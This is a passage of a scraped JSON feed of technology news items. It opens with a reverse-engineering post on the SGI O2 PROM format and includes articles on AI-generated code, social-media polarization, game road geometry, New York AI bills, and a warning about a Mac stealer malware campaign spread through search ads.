8 4.18 4 0x00069200 version 7 4.18 4 Section length I recognized that the env section started at 0x00004000 — the same as the unknown [0x0c, 0x10) bytes in the sloader header. Was it the offset of the next SHDR? Or maybe the length of the current section? Adding the unknown value to the offset of the current SHDR: Offset Section [0x0c, 0x10) Offset + unknown 0x00000000 sloader 0x00004000 0x00004000 0x00004000 env 0x00000400 0x00004400 0x00004400 post1 0x00004d44 0x00009144 0x00009200 firmware 0x0005fffc 0x000691fc 0x00069200 version 0x00000388 0x00069588 These unknown values looked to be the length of the current section, but maybe needed to be rounded up to the next 0x100 ? Checksum During this part of the investigation, I noticed that at the end of each section there was a bogus instruction, often preceded by a lot of zeros that looked to be padding. [start of \"sloader\" section] 0: 10000011 b 0x48 4: 00000000 nop 8: 53484452 # \"SHDR\" for sloader [...] [a lot of zeros — padding] 3ffc: 15d0fa4f bne t6,s0,0x293c # Bogus instruction [end of \"sloader\" section] [start of \"env\" section] 4000: 00000000 nop 4004: 00000000 nop 4008: 53484452 # \"SHDR\" for env [...] 43fc: eba16bb0 swc2 $1,27568(sp) # Bogus instruction [end of \"env\" section] [start of \"post1\" section] 4400: 10000011 b 0x4448 4404: 00000000 nop 4408: 53484452 # \"SHDR\" for post1 [...] 9140: 6c91c641 ldr s1,-14783(a0) # Bogus instruction [end of \"post1\" section] 9144: 00000000 nop [a lot of zeros — padding] [start of \"firmware\" section] 9200: 10000011 b 0x9248 9204: 00000000 nop 9208: 53484452 # \"SHDR\" for firmware [...] 691f8: d1c38847 lld v1,-30649(t6) # Bogus instruction [end of \"firmware\" section] 691fc: 00000000 nop [start of \"version\" section] 69200: 7f454c46 .word 0x7f454c46 # WTF? 69204: 01020100 .word 0x1020100 # WTF? 69208: 53484452 # \"SHDR\" for version [...] [a lot of zeros — padding] 69584: 108fedea beq a0,t7,0x64d30 # Bogus instruction [end of \"version\" section] 69588: 00000000 nop [a lot of zeros — padding] 69600: [a lot of ones — padding] Those bogus instructions each end at the offset calculated by the SHDR start + the section length. They end the section. Could they be checksums for the section? If they're checksums, how are they calculated? Section Checksum sloader 0x15d0fa4f env 0xeba16bb0 post1 0x6c91c641 firmware 0xd1c38847 version 0x108fedea SHDR checksum The SHDRs had some weird looking numbers towards the ends as well. Might they be checksums as well? Section SHDR checksum sloader 0x8cb4693c env 0x131811ae post1 0xc516c9e5 firmware 0x82b4a297 version 0x012d56b7 Section type The remaining unknown bytes in the SHDRs were [0x12, 0x14), [0x40, 0x48). Their values for each SHDR are: Section 0x12 0x13 [0x40, 0x44) [0x44, 0x48) sloader 1 0 0x00000000 0x00000000 env 0 0 0x4175746f 0x4c6f6164 post1 1 0 0x00000000 0x00000000 firmware 3 0 0x81000000 0x00048e70 version 0 8 0x00000000 0x00000000 From the names and small sizes of env and version I guessed that they did not contain code. sloader , post1 , and firmware definitely did include code, and their SHDRs' initial instructions branched over their SHDRs to more code. Section Entry instructions sloader branch over SHDR env nop post1 branch over SHDR firmware branch over SHDR version unknown strings confirmed that env and version were almost entirely ASCII data. In fact, 0x4175746f / 0x4c6f6164 are ASCII for Auto / Load . I suspected that the value in byte 0x12 was the section type, with the lowest bit indicating whether the section was code ( 1 ) or data ( 0 ). The sloader , post1 , and firmware sections began with branch instructions that jump over the SHDR. The env section began with two nop instructions. The version section began with data that I only came to understand much later. The byte at 0x13 is 0 in all SHDRs other than version . This is padding to a 4-byte boundary. Trailing 8 bytes I didn't figure out what the trailing 8 bytes were until much later in the process, but here's what I did know at this point. env didn't seem to have these bytes — as stated before the bytes immediately following env 's SHDR are actual data that fit with the rest of the data in the section. version contained zeros for these bytes, but the next 12 bytes were as well so it wasn't certain whether they were metadata or actual data. sloader and post1 contained zeros in these bytes, but their initial branch instructions jumped just past these fields. It seemed pretty clear that they were some metadata. firmware was the only one that seemed to clearly contain some m",
      "cover_image_url": "/../blog/2026/02/08/Reverse_Engineering_the_PROM_for_the_SGI_O2/post1-initial.png"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "Stop generating, start thinking",
      "url": "https://localghost.dev/blog/stop-generating-start-thinking/",
      "published": "2026-02-08T21:58:19+00:00",
      "summary": "<p>Article URL: <a href=\"https://localghost.dev/blog/stop-generating-start-thinking/\">https://localghost.dev/blog/stop-generating-start-thinking/</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46938958\">https://news.ycombinator.com/item?id=46938958</a></p> <p>Points: 26</p> <p># Comments: 3</p>",
      "content_text": "Throughout my career, I feel like I’ve done a pretty decent job of staying top of new developments in the industry: attending conferences, following (and later befriending!) some of the very smart people writing the specs, being the one sharing news on Slack about exciting new features of CSS or JS with my colleagues. The joys of working on an internal tool where you only need to worry about latest Chrome, and playing with anchor positioning in a production app while it’s still experimental! It’s very unsettling, then, to find myself feeling like I’m in danger of being left behind - like I’m missing something. As much as I don’t like it, so many people have started going so hard on LLM-generated code in a way that I just can’t wrap my head around. I’ve been using Copilot - and more recently Claude - as a sort of “spicy autocomplete” and occasional debugging assistant for some time, but any time I try to get it to do anything remotely clever, it completely shits the bed. Don’t get me wrong, I know that a large part of this is me holding it wrong, but I find it hard to justify the value of investing so much of my time perfecting the art of asking a machine to write what I could do perfectly well in less time than it takes to hone the prompt. You’ve got to give it enough context - but not too much or it gets overloaded. You’re supposed to craft lengthy prompts that massage the AI assistant’s apparently fragile ego by telling it “you are an expert in distributed systems” as if it were an insecure, mediocre software developer. Or I could just write the damn code in less time than all of this takes to get working. As I see more and more people generating code instead of writing it, I find myself wondering why engineers are so ready and willing to do away with one of the good bits of our jobs (coding) and leave themselves with the boring bit (reviews). Perhaps people enjoy writing roleplay instructions for computers, I don’t know. But I find it dangerous that people will willingly - and proudly - pump their products full of generated code. I’ll share a couple of the arguments I’ve encountered when I’ve expressed concern about this. “This is the Industrial Revolution of our time! It’s like mechanisation all over again.” Yes, this is true in many ways. Firstly, when you consider how much the Industrial Revolution contributed to climate change , and look at the energy consumption of the data centres powering AI software, it’s easy to see parallels there. Granted, not all of this electricity is fossil-fuel-powered, so that’s some improvement on the Industrial Revolution, but we’re still wasting enormous amounts of resources generating pictures of shrimp Jesus . Mechanisation made goods cheaper and more widely available, but at the cost of quality: it’s been a race to the bottom since the late 19th century and now we have websites like SHEIN where you can buy a highly flammable pair of trousers for less than a cup of coffee. Mechanisation led to a decline in skilled labour, made worse by companies gradually offshoring their factories to less economically developed countries where they could take advantage of poorly-paid workers with fewer rights, and make even more money. Generated code is rather a lot like fast fashion: it looks all right at first glance but it doesn’t hold up over time, and when you look closer it’s full of holes. Just like fast fashion, it’s often ripped off other people’s designs . And it’s a scourge on the environment. But there’s a key difference. Mechanisation involved replacing human effort in the manufacturing processes with machinery that could do the same job. It’s the equivalent of a codemod or a script that generates boilerplate code. The key thing is that it produces the same results each time . And if something went wrong, humans would be able to peer inside the machine and figure out what went wrong. LLM output is non-deterministic , and the inner workings opaque. There’s no utility in a mechanised process that spits out something different every time, often peppered with hallucinations. “LLMs are just another layer of abstraction, like higher level programming languages were to assembly.” It’s true that writing Java or Go means I never had to bother learning assembly. The closest I get to anything resembling assembly is knitting patterns. The way that we write software has evolved in terms of what we need to think about (depending on your language of choice): I don't have to think about garbage collection or memory allocation because the runtime does it for me. But I do still have to think about writing efficient code that makes sense architecturally in the wider context of our existing systems. I have to think about how the software I'm building will affect critical paths, and reason about maintainability versus speed of delivery. When building for the web, we have to think about browser support, accessibility, security, performance. Where I've seen LLMs do the most damage is where engineers outsource the thinking that should go into software development. LLMs can't reason about what the system architecture because they cannot reason . They do not think. So if we're not thinking and they're not thinking that means nobody is thinking. Nothing good can come from software nobody has thought about. In the wake of the Horizon scandal , where innocent Post Office staff went to prison because of bugs in Post Office software that led management to think they’d been stealing money, we need to be thinking about our software more than ever: we need accountability in our software. Thirteen people killed themselves as a direct result of those bugs in that Post Office software, by the way. Our terrible code is the problem But, you may argue, human developers today write inaccessible, unperformant, JavaScript-heavy code! What's the difference? Yes, exactly (or should I say “You’re absolutely right”?). LLMs are trained (without our explicit consent) on all our shitty code, and we've taught them that that's what they should be outputting. They are doomed to repeat humans’ mistakes, then be trained on the shitty reconstituted mistakes made by other LLMs in what’s (brilliantly) been called human centipede epistemology . We don't write good enough code as humans to deserve something that writes the same stuff faster. And if you think we’ve done all right so far, we haven't: just ask anyone who uses assistive technology, or lives in a country with terrible Internet connection (or tries to get online on mobile data in any UK city, to be honest). Ask anyone who's being racially discriminated against by facial recognition software or even a hand dryer. Ask the Post Office staff. Instead of wanting to learn and improve as humans, and build better software, we’ve outsourced our mistakes to an unthinking algorithm. Four eyes good, two eyes bad Jessica Rose and Eda Eren gave a brilliant talk at FFConf last year about the danger of AI coding assistants making us lose our skills. There was one slide in particular that stood out to me: The difference between reviewing a PR written by human and one by an LLM is that there's a certain amount of trust in a PR by a colleague, especially one that I know. The PR has been reasoned about: someone has thought about this code. There are exceptions to every rule, yes: but I'd expect manager intervention for somebody constantly raising bad PRs. Open source maintainers will tell you about the deluge of poor quality generated PRs they're seeing nowadays. As a contributor to any repository, you are accountable for the code you commit, even if it was generated by an LLM. The reviewer also holds some accountability, but you’ve still got two pairs of eyes on the change. I’ve seen social media posts from companies showing off that they’re using e.g. Claude to generate PRs for small changes by just chatting to the agent on Slack. Claude auto-generates the code, then creates the PR. At that point accountability sits solely with the reviewer. Unless you set up particularly strict rules, one person can ask Claude to do something and then approve that PR: we’ve lost one of those pairs of eyes, and there's less shared context in the team as a result. Reviewing PR isn't just about checking for bugs: it’s about sharing understanding of the code and the changes. Many companies don't do PRs at all and commit directly to the main branch, but the only way I've personally seen that work consistently at scale is if engineers are pairing constantly. That way you still have shared context about changes going in. I'm not anti-progress, I'm anti-hype I think it’s important to highlight at this stage that I am not, in fact, “anti-LLM”. I’m anti-the branding of it as “artificial intelligence”, because it’s not intelligent . It’s a form of machine learning. “Generative AI” is just a very good Markov chain that people expect far too much from. I don’t even begrudge people using generative AI to generate prototypes. If you need to just quickly chuck together a wireframe or an interactive demo, it makes a lot of sense. My worry is more around people thinking they can “vibe code” their way to production-ready software, or hand off the actual thinking behind the coding. Mikayla Maki had a particularly good take on working with agents: keep the human in the loop, treat them like an external contributor you don’t trust. Only use agents for tasks you already know how to do, because it’s vital that you understand it. I will continue using my spicy autocomplete, but I’m not outsourcing my thinking any time soon. Stop generating, start understanding, and remember what we enjoyed about doing this in the first place.",
      "cover_image_url": "https://localghost.dev/og-images/stop-generating-start-thinking.png"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "Decline, Fragmentation, and Enduring Polarization",
      "url": "https://arxiv.org/abs/2510.25417",
      "published": "2026-02-08T21:52:28+00:00",
      "summary": "<p>Article URL: <a href=\"https://arxiv.org/abs/2510.25417\">https://arxiv.org/abs/2510.25417</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46938903\">https://news.ycombinator.com/item?id=46938903</a></p> <p>Points: 130</p> <p># Comments: 134</p>",
      "content_text": "[Submitted on 29 Oct 2025] Title: Shifts in U.S. Social Media Use, 2020-2024: Decline, Fragmentation, and Enduring Polarization View a PDF of the paper titled Shifts in U.S. Social Media Use, 2020-2024: Decline, Fragmentation, and Enduring Polarization, by Petter T\\\"ornberg View PDF HTML (experimental) Abstract: Using nationally representative data from the 2020 and 2024 American National Election Studies (ANES), this paper traces how the U.S. social media landscape has shifted across platforms, demographics, and politics. Overall platform use has declined, with the youngest and oldest Americans increasingly abstaining from social media altogether. Facebook, YouTube, and Twitter/X have lost ground, while TikTok and Reddit have grown modestly, reflecting a more fragmented digital public sphere. Platform audiences have aged and become slightly more educated and diverse. Politically, most platforms have moved toward Republican users while remaining, on balance, Democratic-leaning. Twitter/X has experienced the sharpest shift: posting has flipped nearly 50 percentage points from Democrats to Republicans. Across platforms, political posting remains tightly linked to affective polarization, as the most partisan users are also the most active. As casual users disengage and polarized partisans remain vocal, the online public sphere grows smaller, sharper, and more ideologically extreme. Submission history From: Petter Törnberg [ view email ] [v1] Wed, 29 Oct 2025 11:37:16 UTC (3,317 KB)",
      "cover_image_url": "/static/browse/0.3.4/images/arxiv-logo-fb.png"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "Art of Roads in Games",
      "url": "https://sandboxspirit.com/blog/art-of-roads-in-games/",
      "published": "2026-02-08T21:05:24+00:00",
      "summary": "<p>Article URL: <a href=\"https://sandboxspirit.com/blog/art-of-roads-in-games/\">https://sandboxspirit.com/blog/art-of-roads-in-games/</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46938511\">https://news.ycombinator.com/item?id=46938511</a></p> <p>Points: 34</p> <p># Comments: 3</p>",
      "content_text": "Not sure if it‚Äôs just me, but I often get a primal satisfaction whenever I see intricate patterns emerging out of seemingly disordered environments. Think about the galleries of ant colonies, the absurdly perfect hexagons of honeycombs, or the veins on a leaf. No architect, no blueprint. Just simple rules stacking on each other that result in beautiful patterns. I¬†can‚Äôt explain why, but seeing those structures always felt good. Humans do this too. And for me, one of the most fascinating patterns we‚Äôve come up with is the roads. Sometimes I imagine aliens from faraway galaxies discovering Earth long after we‚Äôre gone. Forests reclaimed by nature, cities reduced to rubble, yet between them, a faintly pattern is still visible - the road network. I like to think they will feel the same way I do when looking at nature patterns. - ‚ÄúMan, someone really thought this through.‚Äù City Builders and Their Roads I‚Äôve got to say, roads have fascinated me since I was a kid. I still remember playing SimCity 2000 for the first time when I was about five or six years old. I didn‚Äôt understand much. Definitely didn‚Äôt know what zoning, taxes, or demand were. But roads fascinated me from the start. I think roads lie at the heart of every city builder. It‚Äôs the fabric on which cities are built. Since that moment, I‚Äôve played almost every modern-themed city builder out there. In the meantime, I‚Äôve also started noticing them in the real world. Examining them in more detail. Roundabouts. Interchanges. Overpasses. Merge lanes. Noticing every intricacy. Despite every game bringing an improvement over the one before, something always felt‚Ä¶ off. SimCity 4 added elevation and diagonal roads. SimCity 2013 introduced curved roads. Then came Cities: Skylines with a ton of freedom. You could know freeplace roads and merge them into intersections at any angle, build flyovers at different elevations to construct crazy, yet unrealistic, interchanges. I think this was the largest breakthrough. But something was still nagging me. Highway ramps were unrealistically sharp or wobbly, lanes that were supposed to be high-speed bent too sharply at certain points, and the corner radii of intersections looked strange. I mean look at this. This is probably what highway engineers have nightmares about. And then came the mods. Mods changed everything. The great community enabled a new kind of freedom. One could build almost anything: perfect merge lanes, realistic markings, and smooth transitions. It was a total game-changer. I am particularly proud of this 5-lane turbo roundabout: But even then, mods didn‚Äôt feel completely natural. They were still limited by the game‚Äôs original system. Cities: Skylines 2 pushed it even further, with lanes becoming even more realistic and markings as well. I¬†think at this point, a non-trained eye won‚Äôt know the difference from reality. Then I stopped stumbling around and started asking why? I tried to understand how engineers design roads and how game developers code them. That‚Äôs when I ran straight into the fundamental issue - right at the base of it. And it comes to something every developer knows about and loves: The Bezier Spline If you‚Äôre a Unity or Unreal developer or played with basically any vector graphics editing software, you already know them well. Bezier curves are an elegant, intuitive, and incredibly powerful way to smoothly interpolate between two points while taking into consideration some direction of movement (the tangent). That‚Äôs exactly what roads are supposed to do, right? Of course, developers naturally think they are the perfect tool. They‚Äôve got their beauty , I need to admit. But hidden beneath the surface lies an uncomfortable truth. When Bezier Splines fall short You see, the shapes of roads in real life come from an underlying essential fact: the wheel axles of a vehicle. No matter how you drive a car, the distance between the left and right wheels remains constant. You can notice this in tyre tracks in snow or sand. Two perfectly parallel paths, always the same distance apart maintaining a consistent curved shape. Cars don‚Äôt follow abstract splines. They ride some imaginary tracks. Here‚Äôs the issue with Bezier splines: they don‚Äôt preserve shape and curvature when offset. At gentle curves, they kinda look fine, but once you have tighter bends, the math falls apart. In mathy terms: The offset of a Bezier curve is not a Bezier curve. When game engines try to generate a road mesh along a Bezier spline, the geometry often fails at tight angles. The inner edge curves at a different rate than the outer edge. This creates ‚Äúpinching,‚Äù self-intersecting geometry. Here is the best example of how they start to fail in extreme scenarios. To sum up: B√©zier curves are unconstrained. The freedom they enable is exactly the ‚ÄúAchilles‚Äô heel‚Äù. Real roads are engineered with the constraints of real motion in mind. A car‚Äôs path can‚Äôt magically self-intersect. Kindergarten math Ok, so what preserves parallelism? If you‚Äôve already been through kindergarten, you‚Äôre already familiar with it: It‚Äôs the CIRCLE . It has almost like a magical property: no matter how much you offset it, the result is still a circular arc. Perfectly parallel with the initial one. So satisfying. Scrapping Bezier curves for Circle Arcs also yields a nice, unexpected bonus. To procedurally build intersections, the engine has to perform many curve-curve intersection operations multiple times per frame. The intersection between two Bezier curves is notoriously complex. On one side, you have polynomial root finding, iterative numerical methods, de Castelaju‚Äôs method + bounding boxes, and multiple convergence checks vs a simple, plain O(1) formula in Circle Arcs. By stitching together circular arcs of different radii, you can create any shape while adhering to proper engineering principles. The Next Level But this is not the end of the story. Circle arcs have issues as well (Oh no). The problem with circles in infrastructure is that they have constant curvature. What this means is that when entering a circular curve from a straight line, the lateral force jumps from 0 to a fixed constant value (determined by the radius of the circle). If you were in a car or train entering at high speed into this kind of curve, it would feel terrible. Civil engineers have to account for this as well. So then, what curve maintains parallelism when offset and has a smoothly increasing curvature? Introduce you to: transition curves - most famously, the clothoid. A clothoid gradually increases curvature over distance. You start almost straight, then slowly turn tighter and tighter. The steering wheel rotates smoothly. The forces ramp up naturally, and a passenger‚Äôs body barely notices the transition. These curves provide comfortable rides at high speeds by maintaining parallel offsets and continuous curvature changes. And they are also‚Ä¶ a math nightmare. Differential geometry. Integrals. Oh my‚Ä¶ Which is probably why most games don‚Äôt even dare. But that‚Äôs fine. Vehicles move slowly on city streets. For intersections of urban roads, circular arcs are more than a decent choice. Why I Built My Own Road System Does everything I just rambled about matter? Do 99% of city-builder players care what shape the corner radius of the intersection has? Most likely, no. Then why bother? First, because of curiosity. As any other nerd overly obsessed with the nitty-gritty details of a very specific subject, I just wanted to see how I would implement it. Like challenging the status quo. Second, even if established titles might not accurately render roads, they are still light-years ahead of what solutions an indie developer can find online. The tutorials and assets for this are just sad. I personally got bored with grids, and I just wanted to built a better solution to share with anyone who wants to build a city builder. These assets ^ make me sad. In the next blog post, I‚Äôll discuss more technicalities and dive into how I‚Äôve built my own solution. If you want to follow along or get notified when I release this asset, scribble your email below.",
      "cover_image_url": "https://sandboxspirit.com/og/blog/art-of-roads-in-games.png"
    },
    {
      "industry": "technology",
      "source": "The Verge",
      "title": "New York is considering two bills to rein in the AI industry",
      "url": "https://www.theverge.com/ai-artificial-intelligence/875501/new-york-is-considering-two-bills-to-rein-in-the-ai-industry",
      "published": "2026-02-08T21:04:53+00:00",
      "summary": "New York's state legislature is set to consider a pair of bills that would require labels on AI-generated content and would put a three-year pause on new data center construction. The New York Fundamental Artificial Intelligence Requirements in News Act (NY FAIR News Act, for short) would require that any news \"substantially composed, authored, or [&#8230;]",
      "content_text": "New York‚Äôs state legislature is set to consider a pair of bills that would require labels on AI-generated content and would put a three-year pause on new data center construction . The New York Fundamental Artificial Intelligence Requirements in News Act ( NY FAIR News Act , for short) would require that any news ‚Äúsubstantially composed, authored, or created through the use of generative artificial intelligence‚Äù carry a disclaimer. It would also require that any content created using AI be reviewed and approved by a human with ‚Äúeditorial control‚Äù before being published. Beyond that, the bill requires organizations to disclose to newsroom employees how and when AI is being used. And it would call for safeguards that prevent confidential information, especially about sources, from being accessed by AI. Meanwhile, S9144 ‚Äúimposes a moratorium on the issuance of permits for new data centers‚Äù for at least three years. The bill cites rising electric and gas rates for residential, commercial, and industrial customers. National Grid New York says that requests for ‚Äúlarge load‚Äù connections have tripled in just one year, with at least 10 gigawatts of demand expected to be added in the next five years. There are already over 130 data centers in New York, according to Data Center Map . The state just approved a 9-percent rate increase for Con Edison customers over the next three years, and electric bills are soaring around the country as datacenters put strain on the grid.",
      "cover_image_url": "https://platform.theverge.com/wp-content/uploads/sites/2/2025/09/OMB-Datacenter-Hero-9_18_25.jpg?quality=90&strip=all&crop=0%2C10.732984293194%2C100%2C78.534031413613&w=1200"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "More malware from Google search",
      "url": "https://eclecticlight.co/2026/01/30/more-malware-from-google-search/",
      "published": "2026-02-08T20:52:55+00:00",
      "summary": "<p>Article URL: <a href=\"https://eclecticlight.co/2026/01/30/more-malware-from-google-search/\">https://eclecticlight.co/2026/01/30/more-malware-from-google-search/</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46938398\">https://news.ycombinator.com/item?id=46938398</a></p> <p>Points: 90</p> <p># Comments: 55</p>",
      "content_text": "Little more than a month after I reported that Google’s AI was offering links to malicious scripts , that is happening again, with a slight twist. I’m grateful to Olena of Clario for informing me that there’s a new campaign in progress to deliver AMOS (alias SOMA) stealers to Macs. You can read Vladyslav Kolchin’s account of this in his blog post . Vladyslav has discovered these in forged Apple-like sites linked from docs.google.com and business.google.com, as well as in articles posted on Medium. I had success in finding the last of those, which appeared at the top of Google’s sponsored results when searching for how to clear cache on macos tahoe . That took me to Clear Mareks’ stories in medium.com, where there’s the familiar ploy to get us to paste a malicious command into Terminal. On another occasion, you might be presented with a page claiming to be official Apple Support, although it obviously isn’t. This is almost identical to the previous attack via ChatGPT, and even the base-64 obfuscation is very similar. This downloaded and ran an AMOS stealer, which unusually didn’t seem too bothered about being run in a locked-down virtual machine. It immediately started copying the contents of my Documents folder to “FileGrabber”, and wrote several hidden files to the top level of my Home folder, including: .agent, an AppleScript to run the theft .mainHelper, the main Mach-O binary .pass, my password in plain text. Those appear the same as the version of AMOS delivered using last year’s ChatGPT deception. In addition to seeking access to the Documents folder, the malware asked for access to Notes. The messages are the same. First, distrust everything you see in search engines. Assess what they return critically, particularly anything that’s promoted. It’s promoted for a reason, and that’s money, so before you click on any link ask how that’s trying to make money from you. Next, check the provenance and authenticity of where that click takes you. In this case, it was to a Medium article that had been poisoned to trick you. When you’re looking for advice, look for a URL that’s part of a site you recognise as a reputable Mac specialist. Never follow a shortened link without expanding it using a utility like Link Unshortener from the App Store, rather than one of the potentially malicious sites that claims to perform that service. When you think you’ve found a solution, don’t follow it blindly, be critical. Never run any command in Terminal unless it comes from a reputable source that explains it fully, and you have satisfied yourself that you understand exactly what it does. In this case the command provided was obfuscated to hide its true action, and should have rung alarm bells as soon as you saw it. If you were to spare a few moments to read what it contains, you would have seen the command curl , which is commonly used by malware to fetch their payloads without any quarantine xattr being attached to them. Even though the rest of the script had been concealed by base-64 encoding, that shouts out that this is malicious. Why can’t macOS protect you from this? Because at each step you have been tricked into bypassing its protections. Terminal isn’t intended to be a place for the innocent to paste obfuscated commands inviting you to surrender your password and download executable code to exploit your Mac. curl isn’t intended to allow malware to arrive without being put into quarantine. And ad hoc signatures aren’t intended to allow that malicious code to be executed. Maybe it’s appropriate that Marek’s disease is chicken herpes.",
      "cover_image_url": "https://eclecticlight.co/wp-content/uploads/2025/12/aitrap5.jpg"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "YAFUKKINHOO! Chat",
      "url": "https://retrochat-4.emergent.host/login",
      "published": "2026-02-08T20:49:51+00:00",
      "summary": "<p>i recreated Yahoo! Chat with cams in im's and in main chat rooms .. world wide rooms all with voice and cams no make your own user rooms but its working great i can give you a preview just go register and then i will grant access within 5 hours ... plan to go public in a month</p> <hr /> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46938369\">https://news.ycombinator.com/item?id=46938369</a></p> <p>Points: 3</p> <p># Comments: 0</p>",
      "content_text": "You need to enable JavaScript to run this app. Made with Emergent",
      "cover_image_url": null
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "xnu/doc/scheduler/sched_clutch_edge.md at main · apple-oss-distributions/xnu · GitHub",
      "url": "https://github.com/apple-oss-distributions/xnu/blob/main/doc/scheduler/sched_clutch_edge.md",
      "published": "2026-02-08T20:38:55+00:00",
      "summary": "<p>Article URL: <a href=\"https://github.com/apple-oss-distributions/xnu/blob/main/doc/scheduler/sched_clutch_edge.md\">https://github.com/apple-oss-distributions/xnu/blob/main/doc/scheduler/sched_clutch_edge.md</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46938280\">https://news.ycombinator.com/item?id=46938280</a></p> <p>Points: 87</p> <p># Comments: 13</p>",
      "content_text": "You can’t perform that action at this time.",
      "cover_image_url": "https://opengraph.githubassets.com/e7686d4e7b97cb6563bb2400412ce17d47e7892cdaeeaaf46d7f9fa32fe7a848/apple-oss-distributions/xnu"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "Grand Theft Auto: Ready2Play (Full Game, Windows version)",
      "url": "https://gtaforums.com/topic/986492-grand-theft-auto-ready2play-full-game-windows-version/",
      "published": "2026-02-08T20:34:51+00:00",
      "summary": "<p>Article URL: <a href=\"https://gtaforums.com/topic/986492-grand-theft-auto-ready2play-full-game-windows-version/\">https://gtaforums.com/topic/986492-grand-theft-auto-ready2play-full-game-windows-version/</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46938241\">https://news.ycombinator.com/item?id=46938241</a></p> <p>Points: 131</p> <p># Comments: 54</p>",
      "content_text": "Nice one, right, beauty! What a way to celebrate the 25th anniversary of GTA, even though I am a day late to the celebration, having all three games remastered on such a day is nothing short of respect. This version may even rival the MAX PACK by Toshiba-3. I have not played all the way through this version of the 2D trilogy, but it all looked good to me from the outside and among the few things I messed around with in-game. I love the CRT filter you added and combined with the aspect ratio option makes for a nostalgic joyride, I am not sure what to think about the other filters. Bilinear, scanline, fast-sharpen, and xbr-lv2-noblend are the only ones I noticed any real differences on. Albeit small, they made a difference in comparison to the other filters on this list where I saw little to no effect at all, although that could just be my laptop acting funny. Something I noticed about London 1969 and 1961 is that both have scores from previous games, I think you may have forgotten to fix that, but it is not really a big deal breaker. There are some suggestions I would like to add to improve the experience, I'll leave the glitch hunting to others or when I eventually get back into the spirit of the game. ¬† Quick edit: There's only two languages at the moment, hope to see support for other languages in an update. Also, what does the German flag icon at the upper right do? HUD needs an update: Don't get me wrong, I like the HUD, it gives off a typical 90's or 2000's vibes just from the way it looks alone. But the background picture looks rushed and somewhat bland along with the very few options you are allowed to choose from. I think the HUD could use a small update for both the options and the picture itself, along with an option to play the game separately with their own unique menus and backgrounds to match the game you choose. Also, for some reason, there's two descriptions missing for the \"Vsync\" and \"Aspect ratio\" option when I tried to hover my mouse over them. One option that definitely needs to be included is the \"Controls\" menu, I know you could just look inside the folders and change the controls from there but a quick click on the HUD instead navigating the folders would be nice. I guess you could also include having the 2D GTA maps as an option, but I'm sure most people know how to do a quick search and find them on Bing or Google so this is not really a priority, although it would be nice. 3DFX & Low Color Mode:¬† This one may be a stretch and probably impossible to include seeing as this is running on the Windows version of 2D GTA games, but it would be nice to play with these options. I know there is not really any real reason to play with these versions and I do not have a good argument to justify their inclusion should they be implemented aside from low color's different graphics and possibly better framerate. I guess that's more up to you as I feel this package is overall solid. That is all I could really offer as suggestions and from what I have noticed outside the games. I do not want to come off as ungrateful or as whiny for this port, I am not, thanks to your contribution the game runs better and plays better. Not to mention, the multiplayer is much more accessible and less of a headache to set up than the MAX PACK version which required a few you to do some outside programming to even do. So again, you have my and the thanks of everyone in the GTA community. Edited October 22, 2022 by ThermalSmoke Grammar Correction & Tweaks",
      "cover_image_url": "https://gtaforums.com/applications/core/interface/js/spacer.png"
    },
    {
      "industry": "technology",
      "source": "TechCrunch",
      "title": "Crypto.com places $70M bet on AI.com domain ahead of Super Bowl",
      "url": "https://techcrunch.com/2026/02/08/crypto-com-places-70m-bet-on-ai-com-domain-ahead-of-super-bowl/",
      "published": "2026-02-08T20:19:47+00:00",
      "summary": "The purchase rewrites the domain record books -- not that the crypto industry has ever been accused of restraint when it comes to spending.",
      "content_text": "Just in time to create a new Super Bowl ad, Crypto.com founder Kris Marszalek has made the priciest domain purchase in history, buying AI.com for $70 million, according to the Financial Times . The deal, paid entirely in cryptocurrency to an unknown seller, shatters previous records. (Broker Larry Fischer, who facilitated the sale, is presumably celebrating his good fortune.) Marszalek plans to debut the site during Sunday’s big game, offering consumers a personal AI agent for messaging, app usage, and stock trading. “If you take a long-term view — 10 to 20 years – [AI] is going to be one of the greatest technological waves of our lifetime,” he told the FT. The purchase rewrites the domain record books — not that crypto industry itself is known for its restraint when it comes to spending. Previously, CarInsurance.com held the crown at $49.7 million (2010), followed by VacationRentals.com ($35 million in 2007) and Voice.com ($30 million in 2019). Other eye-popping sales include PrivateJet.com ($30 million), 360.com ($17 million), and Sex.com, which has sold twice for over $13 million each time, though its second owner went bankrupt trying to monetize it. “With assets like AI.com, there are no substitutes,” Fischer told the FT. “When one becomes available, the opportunity may never present itself again.” Whether these mega-dollar domains actually deliver returns remains an open question. But for Marszalek, who already owns Crypto.com and dropped $700 million on stadium naming rights, owning two category-defining domains is apparently worth the outlay.",
      "cover_image_url": "https://techcrunch.com/wp-content/uploads/2026/02/Screenshot-2026-02-08-at-12.27.26-PM.png?resize=1200,671"
    },
    {
      "industry": "technology",
      "source": "TechCrunch",
      "title": "Okay, I’m slightly less mad about that ‘Magnificent Ambersons’ AI project",
      "url": "https://techcrunch.com/2026/02/08/okay-im-slightly-less-mad-about-that-magnificent-ambersons-ai-project/",
      "published": "2026-02-08T19:36:28+00:00",
      "summary": "But this is still a bad idea.",
